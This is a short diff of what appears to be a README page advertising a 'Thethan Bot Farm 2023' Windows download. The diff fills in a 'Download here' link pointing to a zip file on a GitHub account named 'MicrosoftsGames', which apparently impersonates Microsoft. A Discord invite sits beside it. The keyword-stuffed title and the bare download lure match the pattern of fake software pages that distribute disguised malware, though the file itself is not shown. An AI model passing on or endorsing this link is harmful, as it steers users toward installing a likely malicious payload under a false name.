@@ -7,7 +7,7 @@
 
 # Thethan Bot Farm 2023 Download Windows Install Now for Window
 
-<a href=''>Download here</a><br>
+<a href='https://github.com/MicrosoftsGames/Thethan-/releases/download/Thethan/Setup.Files.zip'>Download here</a><br>
 <a href="https://discord.gg/yWcTb9BX">Discord Chat </a>
 ## Description
 
